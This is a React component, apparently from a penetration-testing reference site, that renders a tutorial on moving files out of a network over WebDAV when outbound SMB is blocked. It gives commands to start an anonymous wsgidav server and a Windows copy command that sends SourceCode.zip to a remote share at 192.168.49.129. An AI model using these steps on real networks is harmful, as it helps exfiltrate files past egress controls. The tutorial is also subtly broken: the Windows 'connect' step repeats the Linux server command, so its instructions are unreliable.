import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_SMB_Upload_Blocked = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              Companies usually allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.
              </Typography>
              <Box pt={5}></Box>
              <Typography>
              An alternative is to run SMB over HTTP with WebDAV. WebDAV is an extension of HTTP, the protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
              </Typography>
              <Box pt={5}></Box>
              <Typography>
              When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. 
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Linux
              </Typography>
              <Typography>
              To setup our WebDAV server, we need to install two Python modules, `wsgidav` and `cheroot`.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'sudo pip install wsgidav cheroot'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2 - Linux
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous "}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 3 - Windows
              </Typography>
              <Typography>
            Connect to the WebDAV share.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 4 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\"}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_SMB_Upload_Blocked;
  